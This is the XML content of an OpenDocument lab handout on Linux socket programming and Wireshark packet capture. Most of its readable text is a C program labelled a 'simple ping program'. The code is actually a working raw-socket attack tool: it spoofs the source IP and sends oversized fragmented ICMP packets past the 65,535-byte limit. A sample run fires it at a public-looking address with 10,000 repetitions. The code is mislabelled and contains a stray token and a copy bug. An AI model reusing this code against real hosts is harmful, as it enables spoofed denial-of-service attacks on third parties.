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55fa" officeooo:paragraph-rsid="001955fa"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001955fa" officeooo:paragraph-rsid="0021efc6"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001b4de7" officeooo:paragraph-rsid="001b4de7"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001ef186" officeooo:paragraph-rsid="001ef186"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001ef186" officeooo:paragraph-rsid="001ef186" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001ef186" officeooo:paragraph-rsid="0021efc6" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001955fa" officeooo:paragraph-rsid="001955fa" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0021efc6" officeooo:paragraph-rsid="0021efc6" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="0021efc6" officeooo:paragraph-rsid="0021efc6" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0021efc6" officeooo:paragraph-rsid="0021efc6"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="002273b5" officeooo:paragraph-rsid="002273b5"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001b4de7" officeooo:paragraph-rsid="001b4de7" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0021efc6" officeooo:paragraph-rsid="0021efc6" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00245ee1" officeooo:paragraph-rsid="00245ee1"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00245ee1"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Courier New" fo:font-size="8pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00245ee1" officeooo:paragraph-rsid="00245ee1"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0.3937in" fo:margin-right="0.3937in" fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false" fo:widows="1" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Courier New" fo:font-size="8pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0.3937in" fo:margin-right="0.3937in" fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false" fo:widows="1" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Times New Roman" fo:font-size="8pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0.3937in" fo:margin-right="0.3937in" fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false" fo:widows="1" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:font-size="8pt" fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0.3937in" fo:margin-right="0.3937in" fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false" fo:widows="1" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#008000" style:font-name="Courier New" fo:font-size="8pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0.3937in" fo:margin-right="0.3937in" fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false" fo:widows="1" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#0000ff" style:font-name="Courier New" fo:font-size="8pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0.3937in" fo:margin-right="0.3937in" fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false" fo:widows="1" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#0000ff" fo:font-size="8pt" fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0.3937in" fo:margin-right="0.3937in" fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false" fo:widows="1" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#800000" style:font-name="Courier New" fo:font-size="8pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0.3937in" fo:margin-right="0.3937in" fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false" fo:widows="1" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="001ef18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efc6" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="0021efc6"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="002273b5"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:color="#ff0000"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#ff0000" style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:color="#ff0000" style:font-name="Courier New" fo:font-size="12pt"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#ff0000" fo:font-size="12pt"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="12pt"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="12pt" fo:language="da" fo:country="DK" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:language="da" fo:country="DK" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties fo:font-size="12pt"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties fo:color="#0000ff" style:font-name="Courier New" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties fo:color="#0000ff" style:font-name="Courier New" fo:font-size="12pt" fo:language="da" fo:country="DK" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties fo:color="#0000ff" style:font-name="Courier New" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties fo:color="#0000ff" style:font-name="Courier New" fo:language="da" fo:country="DK" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:color="#008000" style:font-name="Courier New" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties fo:color="#008000" style:font-name="Courier New" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#008000" style:font-name="Courier New" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#008000" style:font-name="Courier New" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#008000" style:font-name="Courier New" fo:font-size="10pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#008000" style:font-name="Courier New" fo:font-size="8pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#008000" fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#008000" fo:font-size="10pt" fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#008000" fo:font-size="8pt" fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ff0000" style:text-line-through-style="none" style:text-line-through-type="none" style:font-name="Courier New" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" style:text-blinking="false"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ff0000" style:text-line-through-style="none" style:text-line-through-type="none" style:font-name="Courier New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fo:color="#ff0000" style:text-line-through-style="none" style:text-line-through-type="none" style:font-name="Courier New" fo:font-size="10pt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fo:color="#ff0000" style:text-line-through-style="none" style:text-line-through-type="none" style:font-name="Courier New" fo:font-size="8pt" fo:letter-spacing="normal" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" style:text-blinking="false"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Arial" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T36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37" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Arial" fo:font-size="10pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T38" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="10pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal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40" style:family="text">
      <style:text-properties officeooo:rsid="00245e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ocket <text:span text:style-name="T5">programming in Linux </text:span>- wireshark </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P5">Purpose:</text:p>
      <text:p text:style-name="P4">Training how to write a simple <text:span text:style-name="T4">socket program in Linux.</text:span></text:p>
      <text:p text:style-name="P4">Using wireshark <text:span text:style-name="T4">to read and analyze the packets at layer 2,3</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P7">Reference:</text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://www.wireshark.org/"><text:span text:style-name="T4">https://www.wireshark.org/</text:span></text:a></text:p>
      <text:p text:style-name="P10">http://www.gsp.com/cgi-bin/man.cgi?section=2&amp;topic=socket</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P12">Requirement: </text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T2">1.</text:span> <text:span text:style-name="T2">Use socket programming, </text:span><text:span text:style-name="T3">write three simple client-server programs which use:</text:span></text:p>
      <text:p text:style-name="P13"><text:tab/>a. SOCK_STREAM</text:p>
      <text:p text:style-name="P13"><text:tab/>b. SOCK_DGRAM</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1">2</text:span>. <text:span text:style-name="T4">Client is to send “Hello server” to server and server will send back “Hi client”</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1">3</text:span>. <text:span text:style-name="T4">Capture all packets when each program is running</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T40">4. Below is a simple ping program which uses SOCK_RAW, compile then run it...</text:span><text:span text:style-name="T39">You can use network monitoring tools to capture the raw socket datagrams at the target machine to see the effect.</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T39"/></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T6">[root@abc]#cat myping.c</text:span></text:p>
      <text:p text:style-name="P20">/* Must be root or SUID 0 to open RAW socket */</text:p>
      <text:p text:style-name="P21">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P21">#include &lt;sys/types.h&gt;</text:p>
      <text:p text:style-name="P21">#include &lt;sys/socket.h&gt;</text:p>
      <text:p text:style-name="P21">#include &lt;netdb.h&gt;</text:p>
      <text:p text:style-name="P21">#include &lt;netinet/in.h&gt;</text:p>
      <text:p text:style-name="P21">#include &lt;netinet/in_systm.h&gt;</text:p>
      <text:p text:style-name="P21">#include &lt;netinet/ip.h&gt;</text:p>
      <text:p text:style-name="P21">#include &lt;netinet/ip_icmp.h&gt;</text:p>
      <text:p text:style-name="P21">#include &lt;string.h&gt;</text:p>
      <text:p text:style-name="P21">#include &lt;arpa/inet.h&gt;</text:p>
      <text:p text:style-name="P19"> </text:p>
      <text:p text:style-name="P21">int main(int argc, char *argv[])</text:p>
      <text:p text:style-name="P21">{</text:p>
      <text:p text:style-name="P22">  <text:span text:style-name="T11">int s, i;</text:span></text:p>
      <text:p text:style-name="P22">  <text:span text:style-name="T11">char buf[400];</text:span></text:p>
      <text:p text:style-name="P22">  <text:span text:style-name="T11">struct ip *ip = (struct ip *)buf;</text:span></text:p>
      <text:p text:style-name="P22">  <text:span text:style-name="T11">struct icmphdr *icmp = (struct icmphdr *)(ip + 1);</text:span></text:p>
      <text:p text:style-name="P22">  <text:span text:style-name="T11">struct hostent *hp, *hp2;</text:span></text:p>
      <text:p text:style-name="P22">  <text:span text:style-name="T11">struct sockaddr_in dst;</text:span></text:p>
      <text:p text:style-name="P22">  <text:span text:style-name="T11">int offset;</text:span></text:p>
      <text:p text:style-name="P22">  <text:span text:style-name="T11">int on;</text:span></text:p>
      <text:p text:style-name="P22">  <text:span text:style-name="T11">int num = 100;</text:span></text:p>
      <text:p text:style-name="P19"> </text:p>
      <text:p text:style-name="P22">  <text:span text:style-name="T11">if(argc &lt; 3)</text:span></text:p>
      <text:p text:style-name="P22">  <text:span text:style-name="T11">{</text:span></text:p>
      <text:p text:style-name="P22">     <text:span text:style-name="T11">printf("\nUsage: %s &lt;saddress&gt; &lt;dstaddress&gt; [number]\n", argv[0]);</text:span></text:p>
      <text:p text:style-name="P22">     <text:span text:style-name="T11">printf("- saddress is the spoofed source address\n");</text:span></text:p>
      <text:p text:style-name="P22">     <text:span text:style-name="T11">printf("- dstaddress is the target\n");</text:span></text:p>
      <text:p text:style-name="P22">     <text:span text:style-name="T11">printf("- number is the number of packets to send, 100 is the default\n");</text:span></text:p>
      <text:p text:style-name="P22">     <text:span text:style-name="T11">exit(1);</text:span></text:p>
      <text:p text:style-name="P22">   <text:span text:style-name="T11">}</text:span></text:p>
      <text:p text:style-name="P19"> </text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T17">  </text:span><text:span text:style-name="T23">/* If enough argument supplied */</text:span></text:p>
      <text:p text:style-name="P22">  <text:span text:style-name="T11">if(argc == 4)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T17">      </text:span><text:span text:style-name="T23">/* Copy the packet number */</text:span></text:p>
      <text:p text:style-name="P22">      <text:span text:style-name="T11">num = atoi(argv[3]);</text:span></text:p>
      <text:p text:style-name="P19"> </text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T17">    </text:span><text:span text:style-name="T23">/* Loop based on the packet number */</text:span></text:p>
      <text:p text:style-name="P22"><text:soft-page-break/>    <text:span text:style-name="T11">for(i=1;i&lt;=num;i++)</text:span></text:p>
      <text:p text:style-name="P22">    <text:span text:style-name="T11">{</text:span></text:p>
      <text:p text:style-name="P22">       <text:span text:style-name="T11">on = 1;</text:span></text:p>
      <text:p text:style-name="P22">       <text:span text:style-name="T11">bzero(buf, sizeof(buf));</text:span></text:p>
      <text:p text:style-name="P19"> </text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T17">       </text:span><text:span text:style-name="T23">/* Create RAW socket */</text:span></text:p>
      <text:p text:style-name="P22">       <text:span text:style-name="T11">if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; 0)</text:span></text:p>
      <text:p text:style-name="P22">       <text:span text:style-name="T11">{</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">perror("socket() error");</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T17">        </text:span><text:span text:style-name="T23">/* If something wrong, just exit */</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">exit(1);</text:span></text:p>
      <text:p text:style-name="P22">       <text:span text:style-name="T11">}</text:span></text:p>
      <text:p text:style-name="P19"> </text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T17">       </text:span><text:span text:style-name="T23">/* socket options, tell the kernel we provide the IP structure */</text:span></text:p>
      <text:p text:style-name="P22">       <text:span text:style-name="T11">if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &amp;on, sizeof(on)) &lt; 0)</text:span></text:p>
      <text:p text:style-name="P22">       <text:span text:style-name="T11">{</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">perror("setsockopt() for IP_HDRINCL error");</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">exit(1);</text:span></text:p>
      <text:p text:style-name="P22">       <text:span text:style-name="T11">}</text:span></text:p>
      <text:p text:style-name="P19"> </text:p>
      <text:p text:style-name="P22">       <text:span text:style-name="T11">if((hp = gethostbyname(argv[2])) == NULL)</text:span></text:p>
      <text:p text:style-name="P22">       <text:span text:style-name="T11">{</text:span></text:p>
      <text:p text:style-name="P22">         <text:span text:style-name="T11">if((ip-&gt;ip_dst.s_addr = inet_addr(argv[2])) == -1)</text:span></text:p>
      <text:p text:style-name="P22">         <text:span text:style-name="T11">{</text:span></text:p>
      <text:p text:style-name="P22">            <text:span text:style-name="T11">fprintf(stderr, "%s: Can't resolve, unknown host.\n", argv[2]);</text:span></text:p>
      <text:p text:style-name="P22">            <text:span text:style-name="T11">exit(1);</text:span></text:p>
      <text:p text:style-name="P22">         <text:span text:style-name="T11">}</text:span></text:p>
      <text:p text:style-name="P22">       <text:span text:style-name="T11">}</text:span></text:p>
      <text:p text:style-name="P22">       <text:span text:style-name="T11">else</text:span></text:p>
      <text:p text:style-name="P22">           <text:span text:style-name="T11">bcopy(hp-&gt;h_addr_list[0], &amp;ip-&gt;ip_dst.s_addr, hp-&gt;h_length);</text:span></text:p>
      <text:p text:style-name="P19"> </text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T17">        </text:span><text:span text:style-name="T23">/* The following source address just redundant for target to collect */</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">if((hp2 = gethostbyname(argv[1])) == NULL)</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">{</text:span></text:p>
      <text:p text:style-name="P22">         <text:span text:style-name="T11">if((ip-&gt;ip_src.s_addr = inet_addr(argv[1])) == -1)</text:span></text:p>
      <text:p text:style-name="P22">         <text:span text:style-name="T11">{</text:span></text:p>
      <text:p text:style-name="P22">             <text:span text:style-name="T11">fprintf(stderr, "%s: Can't resolve, unknown host\n", argv[1]);</text:span></text:p>
      <text:p text:style-name="P22">             <text:span text:style-name="T11">exit(1);</text:span></text:p>
      <text:p text:style-name="P22">         <text:span text:style-name="T11">}</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">}</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">else</text:span></text:p>
      <text:p text:style-name="P22">            <text:span text:style-name="T11">bcopy(hp2-&gt;h_addr_list[0], &amp;ip-&gt;ip_src.s_addr, hp-&gt;h_length);</text:span></text:p>
      <text:p text:style-name="P19"> </text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">printf("Sending to %s from spoofed %s\n", inet_ntoa(ip-&gt;ip_dst), argv[1]);</text:span></text:p>
      <text:p text:style-name="P19"> </text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T30">        </text:span><text:span text:style-name="T27">/* Ip structure, check the </text:span><text:a xlink:type="simple" xlink:href="http://lxr.linux.no/" office:target-frame-name="_blank" xlink:show="new"><text:span text:style-name="T34">ip.h</text:span></text:a><text:span text:style-name="T27"> */</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">ip-&gt;ip_v = 4;</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">ip-&gt;ip_hl = sizeof*ip &gt;&gt; 2;</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">ip-&gt;ip_tos = 0;</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">ip-&gt;ip_len = htons(sizeof(buf));</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">ip-&gt;ip_id = htons(4321);</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">ip-&gt;ip_off = htons(0);</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">ip-&gt;ip_ttl = 255;</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">ip-&gt;ip_p = 1;</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T17">        </text:span><text:span text:style-name="T20">ip-&gt;ip_sum = 0; </text:span><text:span text:style-name="T23">/* Let kernel fills in */</text:span></text:p>
      <text:p text:style-name="P19"> </text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">dst.sin_addr = ip-&gt;ip_dst;</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">dst.sin_family = AF_INET;</text:span></text:p>
      <text:p text:style-name="P19"> </text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">icmp-&gt;type = ICMP_ECHO;</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">icmp-&gt;code = 0;</text:span></text:p>
      <text:p text:style-name="P19"><text:soft-page-break/><text:span text:style-name="T17">        </text:span><text:span text:style-name="T23">/* Header checksum */</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">icmp-&gt;checksum = htons(~(ICMP_ECHO &lt;&lt; 8));</text:span></text:p>
      <text:p text:style-name="P19"> </text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">for(offset = 0; offset &lt; 65536; offset += (sizeof(buf) - sizeof(*ip)))</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">{</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">ip-&gt;ip_off = htons(offset &gt;&gt; 3);</text:span></text:p>
      <text:p text:style-name="P19"> </text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">if(offset &lt; 65120)</text:span></text:p>
      <text:p text:style-name="P22">         <text:span text:style-name="T11">ip-&gt;ip_off |= htons(0x2000);</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">else</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T17">          </text:span><text:span text:style-name="T20">ip-&gt;ip_len = htons(418); </text:span><text:span text:style-name="T23">/* make total 65538 */</text:span></text:p>
      <text:p text:style-name="P19"> </text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T17">        </text:span><text:span text:style-name="T23">/* sending time */</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">if(sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&amp;dst, sizeof(dst)) &lt; 0)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T17">        </text:span><text:span text:style-name="T21">{</text:span></text:p>
      <text:p text:style-name="P22">           <text:span text:style-name="T15">fprintf(stderr, "offset %d: ", offset);</text:span></text:p>
      <text:p text:style-name="P22">           <text:span text:style-name="T15">perror("sendto() error");</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T15">}</text:span></text:p>
      <text:p text:style-name="P22">     <text:span text:style-name="T15">else</text:span></text:p>
      <text:p text:style-name="P22">       <text:span text:style-name="T11">printf("sendto() is OK.\n");</text:span></text:p>
      <text:p text:style-name="P19"> </text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T17">        </text:span><text:span text:style-name="T23">/* IF offset = 0, define our ICMP structure */</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">if(offset == 0)</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">{</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">icmp-&gt;type = 0;</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">icmp-&gt;code = 0;</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">icmp-&gt;checksum = 0;</text:span></text:p>
      <text:p text:style-name="P22">        <text:span text:style-name="T11">}</text:span></text:p>
      <text:p text:style-name="P22">       <text:span text:style-name="T11">}</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T17">      </text:span><text:span text:style-name="T23">/* close socket */</text:span></text:p>
      <text:p text:style-name="P22">      <text:span text:style-name="T11">close(s);</text:span></text:p>
      <text:p text:style-name="P22">      <text:span text:style-name="T11">usleep(30000);</text:span></text:p>
      <text:p text:style-name="P22">abc     <text:span text:style-name="T11">}</text:span></text:p>
      <text:p text:style-name="P22">    <text:span text:style-name="T11">return 0;</text:span></text:p>
      <text:p text:style-name="P21">}</text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T10">[root@abc]# </text:span><text:span text:style-name="T7">gcc myping.c -o myping</text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T10">[root@]# </text:span><text:span text:style-name="T7">./myping</text:span></text:p>
      <text:p text:style-name="P19"> </text:p>
      <text:p text:style-name="P23">Usage: ./myping &lt;saddress&gt; &lt;dstaddress&gt; [number]</text:p>
      <text:p text:style-name="P23">- saddress is the spoofed source address</text:p>
      <text:p text:style-name="P23">- dstaddress is the target</text:p>
      <text:p text:style-name="P23">- number is the number of packets to send, 100 is the default</text:p>
      <text:p text:style-name="P17">[root@abc]# <text:span text:style-name="T6">./myping  1.2.3.4  203.106.93.94  10000</text:span></text:p>
      <text:p text:style-name="P23">sendto() is OK.</text:p>
      <text:p text:style-name="P23">sendto() is OK.</text:p>
      <text:p text:style-name="P23">...</text:p>
      <text:p text:style-name="P23">...</text:p>
      <text:p text:style-name="P23">sendto() is OK.</text:p>
      <text:p text:style-name="P23">sendto() is OK.</text:p>
      <text:p text:style-name="P23">Sending to 203.106.93.88 from spoofed 1.2.3.4</text:p>
      <text:p text:style-name="P23">sendto() is OK.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P8">Report:</text:p>
      <text:p text:style-name="P10">1. <text:span text:style-name="T5">Capture</text:span> the TCP/UDP header, Ethernet header if any</text:p>
